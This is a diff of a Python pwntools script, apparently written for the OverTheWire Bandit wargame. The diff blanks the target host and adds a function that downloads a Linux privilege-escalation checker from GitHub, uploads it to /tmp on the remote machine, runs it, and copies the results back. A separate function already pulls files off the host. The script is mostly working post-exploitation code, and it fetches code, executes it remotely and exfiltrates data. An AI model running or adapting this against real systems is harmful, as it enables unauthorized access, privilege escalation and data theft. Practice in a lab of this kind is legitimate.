@@ -1,8 +1,9 @@
 from pwn import *
 import os
+import requests
 
 username = "bandit0"
-host = "bandit.labs.overthewire.org"
+host = ""
 password = "bandit0"
 port = 2220
 
@@ -21,7 +22,20 @@ def download_data(shell):
             with open(directory + "/" + exfil_file.split("/")[-1]+".txt", "w") as exfils:
                     exfils.write(to_dl)
 
+def priv_checker(shell):
+    url  = "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py"
+    r = requests.get(url)
+    with open("privs.py", "wb") as handle:
+        for data in r:
+            handle.write(data)         
+    shell.upload("privs.py", "/tmp/privs.py")
+    shell['chmod +x /tmp/privs.py']
+    shell['python /tmp/privs.py > /tmp/privs.txt']
+    privs = shell.download_data("/tmp/privs.txt")
+    with open("privs.txt", "w") as exfils:
+        exfils.write(privs)
+
 if shell.connected():
     print("whoami?: " + shell['whoami'])
-    download_data(shell)
-
+    download_data(shell)    
+    priv_checker(shell)
